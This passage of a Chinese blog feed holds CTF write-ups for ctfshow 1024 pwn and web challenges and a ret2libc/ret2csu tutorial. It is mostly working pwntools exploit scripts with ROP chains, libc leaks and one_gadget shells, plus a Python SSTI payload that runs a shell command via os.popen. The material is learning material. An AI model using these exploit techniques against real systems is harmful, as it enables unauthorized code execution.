        <content type="html"><![CDATA[<p>1024嘛,周末抽空看了下ctfshow1024杯,题总体简单就是参赛晚了。没什么时间打了。</p><a id="more"></a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1024-happy-stack"><a href="#1024-happy-stack" class="headerlink" title="1024_happy_stack"></a>1024_happy_stack</h3><p><img src="image-20201027162241325.png" alt="image-20201027162241325"></p><p>分析题目发现是一个栈溢出,但是要绕一个ctfshow函数.</p><p><img src="image-20201027141150383.png" alt="image-20201027141150383"></p><p>观测发现我们可以用’\00’来截断strcmp的检查.</p><p><img src="image-20201027162743178.png" alt="image-20201027162743178"></p><p>在植入shell时,直接用gadget的方法(学习后发现真的好用)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#from one_gadget import generate_one_gadget</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('111.231.70.44', 28097)</span></span><br><span class="line">p=process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx,rbp,r12,r13,r14,r15)</span>:</span></span><br><span class="line">pay=<span class="string">'36D\00\00'</span>+<span class="string">'a'</span>*(<span class="number">0x380</span><span class="number">-5</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x00000000004007F6</span>)+p64(<span class="number">0</span>)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(<span class="number">0x00004007E0</span>)+<span class="string">'\00'</span>*<span class="number">48</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'puts'</span>],e.got[<span class="string">'puts'</span>],<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'36D\n'</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">real_puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(real_puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, (real_puts))</span><br><span class="line">libcbase =(real_puts) - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b puts')</span></span><br><span class="line">print(hex(libcbase))</span><br><span class="line">one_gadget=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'36D'</span>+<span class="string">'\x00'</span>+<span class="string">'\x00'</span>*<span class="number">0x384</span></span><br><span class="line">payload+=p64(one_gadget)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1024-happy-checkin"><a href="#1024-happy-checkin" class="headerlink" title="1024_happy_checkin"></a>1024_happy_checkin</h3><p>这道感觉上一道简单直接one_gadget一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#from one_gadget import generate_one_gadget</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('111.231.70.44', 28075)</span></span><br><span class="line">p=process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line">print(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=csu(0,1,e.got['puts'],e.got['puts'],0,0)</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x370</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006e3</span>)+p64(e.got[<span class="string">'puts'</span>])+p64(e.plt[<span class="string">'puts'</span>])+p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real_puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(real_puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, (real_puts))</span><br><span class="line">libcbase =(real_puts) - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b puts')</span></span><br><span class="line">print(hex(libcbase))</span><br><span class="line">one_gadget=libcbase+<span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'a'</span>*<span class="number">0x370</span>+p64(<span class="number">0</span>)+p64(one_gadget)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h3><p>这道题有的意识表面考fastapi，实际就考了fastapi特性，更多的还是ssti。</p><p><img src="image-20201027164759063.png" alt="image-20201027164759063"></p><p>进入/docs发现cccalccc存在ssti。故慢慢试探。</p><p><img src="image-20201027165432130.png" alt="image-20201027165432130"></p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">r= requests.session()</span><br><span class="line">url = <span class="string">'http://1dadb4d7-6c85-4cbc-89df-92d370159f5b.chall.ctf.show/cccalccc'</span></span><br><span class="line">headers = &#123;<span class="string">'cookie'</span>:<span class="string">'UM_distinctid=1749ef3c1b2a-0ccbaee915c9eb8-4c312c7c-e1000-1749ef3c1bc46'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.get(url).text</span></span><br><span class="line">x=r.post(url,&#123;<span class="string">'q'</span>:<span class="string">'str(().__class__.__base__.__subclasses__()[95].__init__.__globals__["__builtins__"]["__imp"+"ort__"]("os").__dict__["p"+"o"+"pen"]("cat /mnt/f1a9 ").read())'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> (x.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</title>
      <link href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/"/>
      <url>/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/</url>
      
        <content type="html"><![CDATA[<p>最近,跟着ctf-wiki的进度,在研究64位下ret2csu,发现对之前的Ret2Libc在64位中的用法及64位的函数有些误解导致ret2csu卡了好久.故写文以记之.</p><a id="more"></a><h3 id="64位函数参数传递方式"><a href="#64位函数参数传递方式" class="headerlink" title="64位函数参数传递方式"></a>64位函数参数传递方式</h3><h4 id="Linux-x64"><a href="#Linux-x64" class="headerlink" title="Linux x64"></a>Linux x64</h4><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">call H</span><br></pre></td></tr></table></figure><p>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中(即和32位汇编一样)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br></pre></td></tr></table></figure><h4 id="Win-64"><a href="#Win-64" class="headerlink" title="Win 64"></a>Win 64</h4><p>与linux不同,win64中前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中这4个用于存放参数的寄存器分别是：存放整数参数的RCX，RDX，R8，R9；存放浮点数参数的XMM0，XMM1，XMM2，XMM3。</p><h3 id="Linux-x64-ret2bilc"><a href="#Linux-x64-ret2bilc" class="headerlink" title="Linux x64 ret2bilc"></a>Linux x64 ret2bilc</h3><p> 文件地址:<a href="https://ctf.show/files/09e5e2ba25e8a2f92cfc989e422986e8/pwn?token=eyJ1c2VyX2lkIjo2MzUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjkyfQ.X4QfkQ.e-Di0pNDhoeRLXJkQc8otm-2bD8" target="_blank" rel="noopener">64pwn</a></p><p>在做ctfshow pwn题时,发现有一道题用ret2text本地打得通远程打不通.故想用ret2bilc1的方法来获得shell.然后就踩了一个关于x64函数调用的坑。在Linux x64中，函数会先调用寄存器里面的，然后再调用栈里。（之前一直当成x32那样，把参数直接写在栈上所以失败了）</p><p>通过<code>ROPgadget --binary 64pwn --only &#39;pop|ret&#39;</code>：</p><p><img src="image-20201012174336320.png" alt="image-20201012174336320"></p><p>发现有直接操控第一个参数（rdi）的gadget。</p><p>通过<code>ROPgadget --binary 64pwn --string &#39;/bin/sh&#39;</code>：</p><p><img src="image-20201012175025107.png" alt="image-20201012175025107"></p><p>找到<code>/bin/sh</code>的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./64pwn'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./64pwn'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b main'</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"a"</span> *<span class="number">12</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0000400643</span>)+p64(<span class="number">0x0000000000400664</span>)+p64(e.plt[<span class="string">'system'</span>])+p64(e.plt[<span class="string">'system'</span>])</span><br><span class="line">print(len(<span class="string">"a"</span> *<span class="number">12</span>+p64(<span class="number">0</span>)+ p64(e.symbols[<span class="string">'getFlag'</span>])))</span><br><span class="line">print(hex(e.symbols[<span class="string">'getFlag'</span>]))</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Linux-x64-ret2csu"><a href="#Linux-x64-ret2csu" class="headerlink" title="Linux x64 ret2csu"></a>Linux x64 ret2csu</h3><p>由上面的题可以看见，我们不是每次都能同时控制 rdi, rsi, rdx, rcx, r8, r9这些传递参数的寄存器。因此我们可以,一些默认编译的函数中的 gadgets,来间接达到控制 rdi, rsi, rdx, rcx, r8, r9寄存器.</p><p>在一般的x64位程序，经常会编译以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><p>我们可以在这些函数里，去找有没有我们可以利用的gadgets。</p><p>以<code>__libc_csu_init</code>函数为例，<code>__libc_csu_init</code>的汇编代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E0</span><br><span class="line">.text:00000000004005E0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005E0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005E0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005E0                 push    r15</span><br><span class="line">.text:00000000004005E2                 push    r14</span><br><span class="line">.text:00000000004005E4                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E7                 push    r13</span><br><span class="line">.text:00000000004005E9                 push    r12</span><br><span class="line">.text:00000000004005EB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005F2                 push    rbp</span><br><span class="line">.text:00000000004005F3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005FA                 push    rbx</span><br><span class="line">.text:00000000004005FB                 mov     r13d, edi</span><br><span class="line">.text:00000000004005FE                 mov     r14, rsi</span><br><span class="line">.text:0000000000400601                 sub     rbp, r12</span><br><span class="line">.text:0000000000400604                 sub     rsp, 8</span><br><span class="line">.text:0000000000400608                 sar     rbp, 3</span><br><span class="line">.text:000000000040060C                 call    _init_proc</span><br><span class="line">.text:0000000000400611                 test    rbp, rbp</span><br><span class="line">.text:0000000000400614                 jz      short loc_400636</span><br><span class="line">.text:0000000000400616                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400618                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400620</span><br><span class="line">.text:0000000000400620 loc_400620:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400620                 mov     rdx, r15</span><br><span class="line">.text:0000000000400623                 mov     rsi, r14</span><br><span class="line">.text:0000000000400626                 mov     edi, r13d</span><br><span class="line">.text:0000000000400629                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040062D                 add     rbx, 1</span><br><span class="line">.text:0000000000400631                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400634                 jnz     short loc_400620</span><br><span class="line">.text:0000000000400636</span><br><span class="line">.text:0000000000400636 loc_400636:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400636                 add     rsp, 8</span><br><span class="line">.text:000000000040063A                 pop     rbx</span><br><span class="line">.text:000000000040063B                 pop     rbp</span><br><span class="line">.text:000000000040063C                 pop     r12</span><br><span class="line">.text:000000000040063E                 pop     r13</span><br><span class="line">.text:0000000000400640                 pop     r14</span><br><span class="line">.text:0000000000400642                 pop     r15</span><br><span class="line">.text:0000000000400644                 retn</span><br><span class="line">.text:0000000000400644 ; &#125; &#x2F;&#x2F; starts at 4005E0</span><br><span class="line">.text:0000000000400644 __libc_csu_init endp</span><br><span class="line">.text:0000000000400644</span><br></pre></td></tr></table></figure><p>我们仔细观察可以发现在0x000000000040063A到0x0000000000400644的gadget可以让我们控制到rbx、rbp、r12、r13、r14、r15.而0x0000000000400620到0x0000000000400629的gadget我们可以让我们通过rbx、rbp、r12、r13、r14、r15寄存器可以让我们间接控制rdx、rsi、edi甚至在rbx、rbp合理的情况（rbx值为0，rbp为1）下可以让我们call一个函数。</p><h4 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h4><p>以leve5为例来说，我们可以通过之前说的<code>__libc_csu_init</code>中的那两个gadget来控制一个来函数。先查看leve5属性.</p><p><img src="image-20201014161839287.png" alt="image-20201014161839287"></p><p>查看文件,发现没有命令执行函数与<code>/bin/sh</code>,要通过write出实际地址，计算偏移找libc。</p><p>同时，write要3个参数：write (int fd, const void * buf, size_t count)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |        1          | rdi存放第一参数，标准输出文件描述符：fd &#x3D; 1</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |     write_got     | rsi存放第二参数，需要输出的内存地址：*buf &#x3D; write_got</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |        8          | rdx存放第三参数，输出字节数：count &#x3D; 8</span><br><span class="line">----------------------------------</span><br><span class="line">|    call    |     write_got     | call write_got调用write函数</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure><p>所以我们要rdi，rsi，rdx三个寄存器，因此我们可以用__libc_csu_init里的gadgets来控制rbx、rbp、r12、r13、r14、r15来间接控制 rdi, rsi, rdx。 <img src="image-20201014223603871.png" alt="image-20201014223603871"></p><p>同样的方式来调用read将shell写入，及调用写入的shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x601028</span>  <span class="comment">#e.bss()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbx rbp r12 r13 r14 r15 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell)</span>:</span></span><br><span class="line">pay=<span class="string">'a'</span>*buf+p64(<span class="number">0</span>)</span><br><span class="line">    pay=pay+p64(g1)+p64(<span class="number">0</span>)</span><br><span class="line">pay=pay+p64(rbx)+p64(rbp)</span><br><span class="line">pay=pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay=pay+p64(g2)</span><br><span class="line">pay=pay+<span class="string">'\00'</span>*<span class="number">0x38</span>+p64(lest_cell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'write'</span>],<span class="number">1</span>,e.got[<span class="string">'write'</span>],<span class="number">8</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#write打印实际的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=p.recvline()</span><br><span class="line">print(x+<span class="string">'this one'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_real=p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, u64(puts_real))</span><br><span class="line">libcbase =u64(puts_real) - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">binsh=<span class="string">"/bin/sh\n"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'read'</span>],<span class="number">0</span>,bss_addr,<span class="number">16</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#read将sehll写入</span></span><br><span class="line">print(p.recvline()+<span class="string">'this two'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b main')</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">print(len(p64(system_addr)+<span class="string">"/bin/sh\0"</span>))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#调用shell</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">print(p.recvline()+<span class="string">'this three'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b main')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里要注意的是，第二个gadge后，会按正常执行顺序再次进入第一个gadge，这次栈顶提高了0x38，因此我们要加0x38字符填充。</p><p><img src="image-20201014200307178.png" alt="image-20201014200307178"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-VI/Chapter-64.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-VI/Chapter-64.html</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/pqc1nq" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/bin/pqc1nq</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</title>
